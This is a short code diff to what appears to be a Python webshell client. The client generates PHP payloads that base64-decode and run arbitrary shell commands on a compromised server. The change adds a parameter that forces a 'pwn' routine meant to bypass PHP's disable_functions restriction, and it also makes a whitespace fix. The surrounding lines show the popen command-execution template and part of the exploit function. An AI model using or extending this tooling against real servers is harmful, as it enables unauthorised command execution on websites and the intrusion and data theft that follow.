@@ -187,8 +187,8 @@ def prepare_system_template(exec_func: str):
         SYSTEM_TEMPLATE = """$fp=popen(base64_decode("%s"),'r');$o=NULL;if(is_resource($fp)){while(!feof($fp)){$o.=fread($fp,1024);}}@pclose($fp);"""
 
 
-def get_system_code(command: str, print_result: bool = True):
-    bypass_df = gget("webshell.bypass_df", "webshell")
+def get_system_code(command: str, print_result: bool = True, mode: int = 0):
+    bypass_df = gget("webshell.bypass_df", "webshell") if mode == 0 else mode
     print_command = "print($o);" if print_result else ""
     if (bypass_df == 1):
         return """$o=pwn(base64_decode("%s"));
@@ -600,7 +600,7 @@ function pwn($cmd) {
     ob_start();
     ($helper->b)($cmd);
     $o=ob_get_contents();
-    ob_end_clean(); 
+    ob_end_clean();
     %s
     return $o;
 }""" % (base64_encode(command), print_command)
